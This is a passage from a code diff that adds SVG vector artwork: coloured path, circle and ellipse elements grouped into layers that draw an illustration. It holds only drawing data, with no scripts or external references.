+              d="M284.3 406.3c-4.7-22.1-2.4-28.1-18-48.9-5-6.7-27.8-5.3-38-3.4-12.1 2.7-25.3 19.1-25.3 19.1 10.4 56.3 18.9 50.5 22.2 69s-.1 26.3 20.9 26.3 35.7-9 28.8-27.1c11.6-3.7 13.8-14.1 9.4-35zM126.5 328.4c-4.4 48 12 45.7 60.4 26.9z">
+            </path>
+            <path
+              d="M366.5 370.5l-43.2 32c2.3 1.3 3.6 1.4 6.1 0s8.2-8 10.6-9.8 9-5.5 12.4-7.4a55 55 0 0011.1-8.4c2.7-3 3.7-4 3-6.4z">
+            </path>
+            <path fill="#eb459f" d="M214.3 184.1a97.9 97.9 0 00-92.7 129.1l92.7 66.6a97.9 97.9 0 000-195.7z"></path>
+            <path fill="#0c1aad"
+              d="M242.3 291.3c-9.1-4-9.4-3.9-15.1-11.7s-12-11-19-11l15.4 60.7c18.6 2.7 28.7-7.9 30.1-17.2s-2.3-16.8-11.4-20.8z">
+            </path>
+            <path fill="#0c1aad"
+              d="M234.7 300.6c-3.3-9.7-11-20.5-19.2-28.4a26.7 26.7 0 01-8.2-22.4l1.6-14.2a42.6 42.6 0 00-19.1-40.7 43.5 43.5 0 00-9.7-4.7 42.2 42.2 0 00-16.7-2 42.7 42.7 0 00-39.5 42.6 48.9 48.9 0 00.3 5.4l.7 5.8 3.2 24.8a72.5 72.5 0 01-3.5 33.3 58 58 0 00-3 13.1l75.5 62.1a58.3 58.3 0 0037.6-74.7z">
+            </path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M197.1 375.3a58.3 58.3 0 0037.6-74.7c-3.3-9.7-11-20.5-19.2-28.4"></path>
+            <path fill="#0c1aad"
+              d="M213.4 305.8c5.2-11.4 7.9-10.4 19.6-9 9.3 1.1 21.9 18.2 9 29.5s-42.2 9.7-28.6-20.5z"></path>
+            <circle cx="176.4" cy="277.3" r="3"></circle>
+            <circle cx="194" cy="276" r="3"></circle>
+            <path fill="none" stroke="#fff" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.7"
+              d="M194 276c16.1 10 10.9 19.6 24.9 35.8"></path>
+            <path fill="#ffc619" d="M180.3 305.5c8.4-7.7 10.9-9.8 14.3-10.1s9.2-.5 9.2-.5l1.6 36.7-22.8 2.6z"></path>
+            <path
+              d="M223.5 290a3.3 3.3 0 00-3.4-4h-15.5a4.8 4.8 0 00-4.7 4l-5.2 32.9a3.4 3.4 0 003.5 4h15.5a5 5 0 004.7-4z">
+            </path>
+            <path d="M222.5 286.9L224.3 288.6 219.8 289.7 222.5 286.9z"></path>
+            <path fill="#ffc619" d="M232.2 306.9c-2.2-2.9-4.5-6.7-9.8-6.7v6.7z"></path>
+            <path fill="#fff"
+              d="M225.2 291.6a3.4 3.4 0 00-3.5-4h-15.5a5 5 0 00-4.7 4l-5.1 32.8a3.3 3.3 0 003.4 4h15.5a4.8 4.8 0 004.7-4z">
+            </path>
+            <path fill="#ffc619"
+              d="M221.9 304.8h6.3a4.9 4.9 0 014.9 4.8 4.9 4.9 0 01-4.9 5.1h-4.6a6.5 6.5 0 01-6.3-5c-.4-2.7 1.6-4.9 4.6-4.9z">
+            </path>
+            <path fill="#ffc619"
+              d="M220.8 314.4h4.4a4.9 4.9 0 014.8 5.8 4.8 4.8 0 01-4.8 4h-2.7a6.5 6.5 0 01-6.3-4.9c-.4-2.7 1.6-4.9 4.6-4.9z">
+            </path>
+            <path fill="#ffc619" d="M194 325.9H209.2V331.94H194z"></path>
+            <path fill="#ffc619"
+              d="M210.1 307.3h-9.5a2.3 2.3 0 01-2.2-1.4l-1.1-2.4-1.2-4.9-3.3 18.5h15.6a6.5 6.5 0 006.3-4.9c.4-2.7-1.6-4.9-4.6-4.9z">
+            </path>
+            <path fill="#ffc619" d="M208.1 317.1h-15.3l1.9 9.9h11.7c2.9 0 5.8-2.2 6.2-4.9s-1.5-5-4.5-5z"></path>
+            <path fill="#66bcff"
+              d="M320.7 362.9c-1.1-14.9-13.8-15.5-22.8-19.6s-20.1-13.6-31.3-19.7-20.2-4.4-37.1 3.4l24.2 36c12.1 4.2 15.2 10.1 22.3 17.9s15.5 9.8 23.6 7.2c5 6.3 6 7.8 11.9 4.8s15.8-9.3 17.7-17.7-2.4-9.4-8.5-12.3z">
+            </path>
+            <path fill="#45aaf7"
+              d="M313.1 388h-.1c-5.3-.6-7.8-3.2-11.6-7.2-.9-1.1-2-2.2-3.3-3.5-14.6-.9-21.3-7.7-25.1-12.7-1.7-2.4-4.7-4-7.6-5.7s-5.6-3.2-7.5-5.5a29.7 29.7 0 01-3.6-5.4c-1.5-2.6-2.6-4.5-4.5-4.7s-4.8 1.2-7.6 2.9a37.2 37.2 0 01-8 3.9.9.9 0 01-1.1-.6.8.8 0 01.6-1.1 34.9 34.9 0 007.5-3.7c3.1-1.9 5.8-3.5 8.8-3.2s4.2 2.8 5.8 5.6a57 57 0 003.4 5.2c1.7 2 4.4 3.5 7.1 5.1s6.2 3.5 8.2 6.1c3.8 5.2 10.1 11.3 24.1 12h.3l.3.2 3.5 3.7c3.6 3.9 5.8 6.2 10.5 6.7a.9.9 0 01.8 1 1.1 1.1 0 01-.9.9z">
+            </path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M250.4 340.3a83.6 83.6 0 00-1.5 18.6"></path>
+            <path fill="#8cd9ff"
+              d="M266.6 410.7c-11.4 13.1-22.5 11.5-27.5 11.6s-4.9-3.5-5.7-6.4-1.5-7.6-1.5-7.6c-12.7 1-15.2-7.3-16.3-14.9-.8-5.8-3.2-8.4-4.7-13.6a97.8 97.8 0 01-77.4-42.5l12.2-11.4 31.3 14.7c19-10 29.6-15.3 40.1-17.6s21.6.4 26.6 14.6 6 18.8 10 25.4l4.4 6.4c4.8 7.3 10.1 17.7 3.5 30.9a70.8 70.8 0 005 10.4z">
+            </path>
+            <path d="M158.1 362c-1.6-9.7 1.5-17.1 8.1-19.2l-18.5-9.3-11.7 7a96 96 0 0022.1 21.5z"></path>
+            <path fill="#66bcff"
+              d="M242.8 416.8V415c-2.5-.1-2.9-1.9-4.5-10.3l-.2-1.1h-.7c-5.7-.6-9.8-3.3-11.3-14.5a37.7 37.7 0 00-4.9-15 34 34 0 01-1.6-3.4c-.4-1.1-.9-2.1-1.3-3.1a22.2 22.2 0 01-2.7-12c.1-4.4-.5-6.6-2.1-7.6s-4.8-.3-9.8 2.1l-.7.3c-7.8 3.8-23.5 11.3-39.9 15l2.3 1.4c15.8-3.9 30.8-11.1 38.4-14.8l.7-.3c3.9-1.9 6.8-3 8.1-2.2s1.3 2.5 1.2 6a25.8 25.8 0 002.8 12.9c.5 1 .9 1.9 1.3 2.9a31.4 31.4 0 001.8 3.7c1.6 2.9 3.5 6.5 4.6 14.4 1.4 10.2 5 14.9 12.2 15.9 1.6 8.2 2.2 11.3 6.3 11.5z">
+            </path>
+            <path fill="#0c1aad"
+              d="M180.3 303.5c-4.3-2.9-7.4-2.2-12 .5-5.7-3.8-12.4-3.6-19.1-.2-4.9 2.4-16.9 7.8-22.9 10.5a2.1 2.1 0 01-2.9-2.2l2.8-17.2c-13.5 13.1-15.8 37.3-9.7 49.5s26.6 9.1 32.7 4.7 8.2-6 15.8-5.6 13.6.4 22.5-8.4l5.6-2.8c.9-12.9-2.1-21.6-12.8-28.8z">
+            </path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M180.3 303.5c-4.3-2.9-7.4-2.2-12 .5-5.7-3.8-12.4-3.6-19.1-.2-4.9 2.4-16.9 7.8-22.9 10.5M169.3 304.5c12.5 7.7 16.1 17.7 17.6 24.4">
+            </path>
+            <path fill="#fff"
+              d="M255.6 258.2h-17.1a.8.8 0 00-.8.7l-2.2 13.9a.8.8 0 001.3.8l19.3-13.9a.8.8 0 00-.5-1.5z"></path>
+            <path fill="#fff"
+              d="M294.9 262.9c10.4 0 20.3-8.4 21.9-18.7v-.5c1.7-10.2-5.6-18.7-16-18.7H243c-10.4 0-20.3 8.5-21.9 18.7v.5c-1.7 10.3 5.5 18.7 16 18.7z">
+            </path>
+            <path fill="#8cd9ff"
+              d="M240.3 251.8a9.5 9.5 0 009-7.7v-.2a6.4 6.4 0 00-6.6-7.7 9.4 9.4 0 00-9 7.7v.2a6.5 6.5 0 006.6 7.7z">
+            </path>
+            <path fill="#66bcff"
+              d="M267.7 251.8a9.6 9.6 0 009-7.7v-.2a6.5 6.5 0 00-6.6-7.7 9.4 9.4 0 00-9 7.7v.2a6.5 6.5 0 006.6 7.7z">
+            </path>
+            <path fill="#8cd9ff"
+              d="M295 251.8a9.4 9.4 0 009-7.7v-.2a6.5 6.5 0 00-6.6-7.7 9.4 9.4 0 00-9 7.7v.2a6.5 6.5 0 006.5 7.7z">
+            </path>
+            <path fill="#29cc7a"
+              d="M209.8 294.1a1.5 1.5 0 00-1.4-1.7H207a1.9 1.9 0 00-1.7 1.4l-.7 4.7a1.5 1.5 0 001.4 1.7h1.4a1.7 1.7 0 001.6-1.4z">
+            </path>
+            <path fill="#ffc619"
+              d="M184.6 270.7A16.5 16.5 0 01195 261c.2 0 .3-.2.2-.4-2.5-6.4-2-10.3-.2-15.4 0-.2-.1-.4-.3-.4-8.1-2.2-11.7-7.2-12.9-11.3a.4.4 0 00-.7 0c-2.7 7.3-7.3 8.2-11.4 8.3a.3.3 0 00-.3.5c4.8 7.1 2.7 13-.9 17.4a.3.3 0 00.2.6c8 .2 12.7 4.7 15.3 10.4a.3.3 0 00.6 0z">
+            </path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M208.1 317.1L200 317.1"></path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M222.4 314.7L226.9 314.7"></path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M181.4 233.3c2.7-8.3 1.8-13.6.6-16.5M194.1 245.2c5.5-.3 8.9-2.1 11.8-5.2M184.6 270.7a13 13 0 010 3.1M169.1 259.7c-4.7 4.4-12.5 4.9-18.1 4M169.7 241.8c-2.4-3.7-6.5-7.7-10-8.9M195.2 260.6a29.7 29.7 0 005.9 1.3">
+            </path>
+            <path fill="#c40655"
+              d="M178.7 247.8c3.5 8.8 6.5 7.9 7.5 5s1.7-6.6 4-6.6 2 3.8 0 9.7-6.1 7.8-10.7 3.6-5.2-9-5.7-12.3 2.9-4.5 4.9.6z">
+            </path>
+            <path fill="none" stroke="#fff" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.7"
+              d="M176.4 277.3c3.8 18.8-5 29.2-5.8 48.6"></path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M209.9 378.5a46.4 46.4 0 01-.8-34.9M206.1 360c-2.9-3.7-3.3-9.5-3.3-9.5"></path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M131.5 312L121.6 316.7"></path>
+            <path fill="none" stroke="#000" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.201"
+              d="M234.5 296.5L240.2 297.4"></path>
+            <path fill="#d11583"
+              d="M366.6 370.3a23.3 23.3 0 01-2.3 3.5c-4 5-13.5 11.4-18.7 14.2s-6.7 4-10.4 7.8-8.1 8.8-11.9 6.7-9.7-7.5-13.4-11.4a1.7 1.7 0 01-.4-1.7c1.4-5.8 6.7-14.5 15.2-19.9a1.9 1.9 0 011.8 0c5.7 3 9 3.5 13.3 2.8 6.4-.9 12.3-4.7 18.8-7.6s7.1.2 8 5.6z">
+            </path>
+            <path fill="#fa80ba"
+              d="M314.4 395.5a71.4 71.4 0 008.9 7c3.8 2.1 8.3-2.9 11.9-6.7s5.2-4.9 10.4-7.8 14.7-9.2 18.7-14.2a23.3 23.3 0 002.3-3.5c-.9-5.4-2.5-8-8-5.6s-8.4 4.3-12.6 5.9a7 7 0 00-4.3 5.9c-.1 1.5-.1 3.1-.1 4.9-7.7-.4-14.6 3-15.1 13 0 0-6.8-2.5-12.1 1.1z">
+            </path>
+            <path fill="#ffe75c"
+              d="M364.3 373.8a31.5 31.5 0 002.2-3.3 1.2 1.2 0 00.2-1 7.7 7.7 0 00-1.1-3c-.9 2.3-2.5 4.6-6.5 8.4-6.3 5.9-13.7 8.7-18.1 11a31 31 0 00-10.3 8.5 20.9 20.9 0 01-9 7.1l1.6 1c3.8 2.1 8.3-2.9 11.9-6.7s5.2-4.9 10.4-7.8 14.7-9.2 18.7-14.2z">
+            </path>
+            <path fill="#d11583"
+              d="M280.6 391.8c-7.3-.9-14.1 3.4-19.2 16.3-1.9-1.1-6.5-2-13.1.2s-8.6 5.3-9.5 7.8a6.1 6.1 0 000 4.2c.5 1.6 1.3 3.9 2.6 7.7 2 5.8 1.8 11.1 5.3 11.2l42.8-39.9s.5-6.3-8.9-7.5z">
+            </path>
+            <path fill="#fa80ba"
+              d="M280.6 391.8c-7.3-.9-14.1 3.4-19.2 16.3-.6 1.6-1.2 3.6-1.8 5.8-7.3.4-10.4 4-10.8 11.2 0 0-5.3-2.5-7.8 1.7.1.4.3.8.4 1.2 2 5.8 1.8 11.1 5.3 11.2l42.8-39.9s.5-6.3-8.9-7.5z">
+            </path>
+            <path fill="#ffe75c"
+              d="M289.1 397.3l-3.8-2.6c-6-.2-11 .3-15.6 7s-7.3 13.6-12.4 18.3c-7.3 6.9-13.6 10.2-14.2 14.6.7 2.7 1.5 4.5 3.6 4.6l42.8-39.9a6.5 6.5 0 00-.4-2z">
+            </path>
+            <path fill="#d11583"
+              d="M282.6 392.9l3.5.5a1.9 1.9 0 011.5.8c1.6 1.7 2.2 4.4 2.2 7l-12.4-.5c3.9-2.5 5-4.6 4.4-6.8a.7.7 0 01.8-1z">
+            </path>
+            <path
+              d="M246.9 439.2c12.1.7 17-3.7 21.5-9.7a36.5 36.5 0 016.7-6.9c6.6-5.1 11.7-10.1 14.7-17.4 3.8-9.2-9-10-15.8-2.8s-6.4 14.6-20.2 25.8c-9.4 7.7-10.5 10.8-6.9 11z">
+            </path>
+            <ellipse cx="244.3" cy="417.4" fill="#fff" rx="1.6" ry="2.5" transform="rotate(-2.3 243.27 418.52)">
+            </ellipse>
+            <path fill="#d11583"
+              d="M366.9 368.6a14.7 14.7 0 00-1.9-3.8.2.2 0 00-.4-.1h-.2a.4.4 0 00-.2.4c1 2.8 1.6 6 .4 8.2 2.9-2.9 2.3-4.2 2.3-4.7z">
+            </path>
+            <ellipse cx="317.8" cy="387" fill="#fff" rx="2.4" ry="3.6" transform="rotate(-18.1 318.119 387.354)">
+            </ellipse>
+          </g>
+          <g data-name="Layer 21">
+            <path fill="#4452f2"
+              d="M290.1 1034.3a76.2 76.2 0 01-75-62.7c-6-33.7-12-60.4-20.5-82.8l140-51.3c6.6 22.6 16.7 52.1 29.3 102 12.1 48.1-24.2 94.8-73.8 94.8z">
+            </path>
+            <path fill="#ffc619"
+              d="M488.9 731.9c-4.7-6-6.7-5-10.2-5 0-5.9-2.8-6.4-4.1-1.5s-2.1 7.2 1.1 11.9 7.5 11.6 9.4 19.8a135.9 135.9 0 00-13.4 4.4l7.8 18.1c13-5.8 20.6-10.8 21.4-21.2s-7.2-20.4-12-26.5z">
+            </path>
+            <path fill="#bde9ff"
+              d="M350.2 707.9c10.4.1 18.2.5 29.2 4a18.2 18.2 0 0112.8 17.5v40h-4l-2.1-3.3v-31.5a16.2 16.2 0 00-12.3-15.8 125.3 125.3 0 00-19.9-3.1l-5-7.7z">
+            </path>
+            <path
+              d="M397 747a7.7 7.7 0 017.7 7.7V795a7.7 7.7 0 01-7.7 7.7 9.7 9.7 0 01-9.7-9.7v-36.3a9.7 9.7 0 019.7-9.7z"
+              transform="rotate(-180 396 774.85)"></path>
+            <circle cx="271.2" cy="806.2" r="112.7" fill="#0c1aad"></circle>
+            <path fill="#039c78" d="M163.8 772a112.8 112.8 0 0049.5 130.9A80.9 80.9 0 00163.8 772z"></path>
+            <path fill="#fa94c4"
+              d="M179.8 785.6c-7.4-2.8-8.5-4.1-10.3-7.6s-2.8-2.8-6.5-3.3c-.3 1-.6 1.9-.8 2.9 14.8 9.7 18.9 30.7 18.9 30.7l6.2-2.9s0-17.1-7.5-19.8z">
+            </path>
+            <path fill="url(#linear-gradient)"
+              d="M160.3 826.5a112.7 112.7 0 00218.8 11.9L260.7 789c-26.8-7.4-73.4-10.1-100.4 37.5z"></path>
+            <path d="M347.9 887.4c-23.2 0-65.4 4.5-90.1-23.4 17.9 20.2 26.3 35.4 26.9 54a112.3 112.3 0 0063.1-29.3z">
+            </path>
+            <path fill="#fa80ba"
+              d="M175.8 806.2c13.9-13.7 53.3-23.4 85.4 0l12.4-13.1c-1-21.6-5.8-22.9-12.4-16s-8 .7-14.5-11-14.7-13.9-20.6-1.9-4.6 12.4-9.5 10.7-14-6.1-21.6-7.2-11.2 9.7-10.5 17.9-1.4 7.9-5.3 6.3-4.9 3.4-3.4 14.3z">
+            </path>
+            <path fill="none" stroke="#ff5cb4" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2.289"
+              d="M234.4 790.9a113.1 113.1 0 00.7-30M192 772c5.8 12 6.8 18 6.8 18"></path>
+            <path fill="#2ad17d"
+              d="M498.5 806.2c3.4-11 4.4-11.2-18.2-10.3-20.8.8-47.1 1.6-71.2 3.4-1.2-14.6-5.9-20.4-11.2-28 2-24.1-2.4-47.5-26.3-53.2s-59.1-6.9-82.5 1.8-16.8 42.2-14.3 64.9c0 0-20.7 6.7-28.5 27.2-6.5 17.3-3.4 37.9 15.1 55.7 29.7 28.6 59.6 31.7 87.9 28.4 22-2.7 33.1-19.5 36.2-35.8 40.3 15.1 65.9-7.6 74.8-18.5 10.5-12.6 25.4-16.7 34.4-20.6s12.8-7.4 3.8-15z">
+            </path>
+            <path fill="#fa80ba"
+              d="M302 681.8c-8.5-.5-17.5 5.1-11.5 21.2-9.2-.9-18.4 4.2-11.9 19.3l42.3-14.4c-3.7-18.6-10.4-25.5-18.9-26.1z">
+            </path>
+            <rect width="37.4" height="66.89" x="262.7" y="741.4" rx="18.7"></rect>
+            <path fill="#fff"
+              d="M355.6 709.2v6c-17.6-2.3-39.4-2.5-57.3 1.9a16.4 16.4 0 00-12.3 15.8v34.8h-21.8v-36.2a22 22 0 0118.3-21.7c32.4-5.7 54.9-3.5 73.1-.6z">
+            </path>
+            <path fill="#bde9ff"
+              d="M321.9 706.3c-10.4 0-18.2.5-29.2 3.9a18.4 18.4 0 00-12.8 17.5v40h4l2.1-3.2v-31.6a16.4 16.4 0 0112.3-15.8 125.4 125.4 0 0119.9-3l5-7.8z">
+            </path>
+            <path fill="#039c78"
+              d="M416.6 804.3c-24.4 1.2-51.4 2.8-61.2 3.2s-15.6.7-17.3 5.4 11.7 5.4 28.6 6.5 55 .9 77 0a485.7 485.7 0 0048.6-4.1c10.3-1.5.5-8.3.5-8.3s3.9-6.2-1.7-6.9-74.5 4.2-74.5 4.2z">
+            </path>
+            <path fill="#fff"
+              d="M391.1 813.6c1-14.6 6.6-15.4 9-11.5a26.5 26.5 0 013.4 7.8 3.8 3.8 0 013.6 0 4.5 4.5 0 012.3 3.7zM357.8 812.3c3.5-10.1 10.7-8.2 15.7-5.9a7.9 7.9 0 014.9 6.9zM346.7 811.9c2.7-10.4 5.5-9.7 6.4-5.7s1.2 6.1 1.2 6.1z">
+            </path>
+            <path fill="#ffc619"
+              d="M488.2 808.6c-14.6 2.3-41.1 4.6-75.1 5-.9-8.4 1.7-15.7 12-23.7 4.5-3.5 4.1-6.1 3.7-8.4-1.3-8.3-4.5-16.6-9.3-27.3-7.3-16.5-8.2-30.1 3.9-37.5s26-3.2 35.3 10.5 29.8 43.8 29.5 81.4z">
+            </path>
+            <path fill="#ffae00" d="M447.4 734.6c9 8.5 12.4 7.5 14.4 7s.3-5.6-.8-7.9z"></path>
+     
